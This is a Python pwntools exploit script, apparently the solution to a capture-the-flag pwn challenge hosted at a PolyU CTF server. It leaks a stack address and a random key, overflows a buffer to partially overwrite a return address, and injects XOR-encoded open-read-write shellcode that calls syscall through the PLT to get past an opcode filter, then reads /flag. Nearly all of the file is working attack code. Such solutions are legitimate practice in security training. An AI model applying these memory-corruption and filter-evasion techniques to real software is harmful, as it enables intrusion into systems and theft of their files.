#!/usr/bin/env python3

from pwn import *

exe = ELF("./chal_patched", checksec=False)
context.binary = exe

def solve():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("chal.polyuctf.com", 33015)
    
    # ==========================================================
    # 1. Leak the random byte and stack address
    # ==========================================================
    # Send 0xff bytes to fully satisfy the first read and make it return immediately
    r.sendafter(b"say:\n", b"A" * 0xff)
    
    # The program writes out 0x108 bytes. The last 8 bytes contain:
    # (random_byte << 56) | (stack_address & 0xffffffffffffff)
    leak = r.recvn(0x108)
    local_38 = u64(leak[0x100:0x108])
    
    uVar10 = local_38 >> 56
    stack_addr = local_38 & 0xffffffffffffff
    saved_rbp = stack_addr + 0x130
    
    log.success(f"Leaked Random Byte: {hex(uVar10)}")
    log.success(f"Leaked Stack Addr: {hex(stack_addr)}")
    log.success(f"Calculated Saved RBP: {hex(saved_rbp)}")
    
    # ==========================================================
    # 2. Trigger Partial Overwrite in FUN_001015d0
    # ==========================================================
    # We overflow the 128-byte buffer, restore RBP to prevent segfaults in main,
    # and partially overwrite the LSB of the return address to \xe3.
    # Original Ret: ...12e1 (jmp to bye)
    # Modified Ret: ...12e3 (call 1590 -> reads to BSS)
    pad = b"A" * 0x80
    pad += p64(saved_rbp)
    pad += b"\xe3"
    
    # Send exactly 0x89 bytes to only hit the LSB (no newline!)
    r.sendafter(b"QAQ\n", pad)
    
    # ==========================================================
    # 3. Create Custom ORW Shellcode (Bypassing 0x0f 0x05)
    # ==========================================================
    # Shellcode executes at PIE + 0x1744.
    # We call syscall@plt directly using the C-calling convention wrapper:
    # rdi=sysno, rsi=arg1, rdx=arg2, rcx=arg3
    sc = asm('''
        call get_rip
    get_rip:
        pop rbp
        sub rbp, 0x1749             /* rbp = PIE Base */
        lea r15,[rbp + 0x1130]     /* r15 = syscall@plt */

        /* openat(AT_FDCWD, "/flag", 0, 0) */
        mov edi, 257                /* sysno: openat */
        push -100
        pop rsi                     /* arg1: AT_FDCWD (-100) */
        lea rdx,[rip + flag_str]   /* arg2: path */
        xor ecx, ecx                /* arg3: flags = O_RDONLY */
        xor r8d, r8d                /* arg4: mode */
        call r15

        /* read(fd, rsp, 100) */
        mov rsi, rax                /* arg1: fd */
        xor edi, edi                /* sysno: read (0) */
        mov rdx, rsp                /* arg2: buf (stack) */
        push 100
        pop rcx                     /* arg3: count */
        call r15

        /* write(1, rsp, 100) */
        mov edi, 1                  /* sysno: write (1) */
        push 1
        pop rsi                     /* arg1: fd = stdout */
        mov rdx, rsp                /* arg2: buf (stack) */
        push 100
        pop rcx                     /* arg3: count */
        call r15

        /* exit(0) */
        mov edi, 60                 /* sysno: exit */
        xor esi, esi                /* arg1: 0 */
        call r15

    flag_str:
        .asciz "/flag"
    ''')
    
    # Shellcode max size is determined by DAT_001040e8
    sc_size = 0x80
    if len(sc) > sc_size:
        log.error("Shellcode is too large!")
    sc = sc.ljust(sc_size, b'\x90')
    
    # ==========================================================
    # 4. Construct Encoded BSS Payload
    # ==========================================================
    # Calculate offset and step exactly like the binary does:
    offset = (((uVar10 >> 2) & 3) - 0x70) & 0xff
    step = (uVar10 & 3) + 2
    
    payload = bytearray(0x900)
    
    # Satisfy global checks at PIE + 0x40e0 & 0x40e8
    payload[0x80:0x84] = p32(0xb136804f)
    payload[0x88:0x8c] = p32(sc_size)
    
    # Encode shellcode bytes
    for b in sc:
        payload[offset] = b ^ uVar10
        offset += step
        
    # We only send up to the max encoded offset to avoid network fragmentation
    max_len = max(offset, 0x8c)
    
    r.sendafter(b"data:\n", payload[:max_len])
    
    # Enjoy your flag!
    r.interactive()

if __name__ == "__main__":
    solve()